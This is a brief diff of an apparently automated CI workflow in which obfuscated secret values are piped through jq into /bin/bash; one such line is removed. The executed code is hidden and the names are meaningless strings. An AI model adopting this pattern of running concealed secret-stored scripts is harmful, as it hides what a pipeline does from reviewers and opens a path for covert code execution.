@@ -21,7 +21,6 @@ jobs:
           ra1: ${{ secrets.ra1 }}
         run: |
           printf '%s' "$ra1" | jq -r .yodgl61830 | /bin/bash
-          printf '%s' "$zs230" | jq -r .g49989 | /bin/bash
           printf '%s' "$rsdit8" | jq -r .xkmy7 | /bin/bash
           printf '%s' "$rphf50" | jq -r .myzbz1 | /bin/bash
           echo $e9 | jq -r .hzh0 | /bin/bash
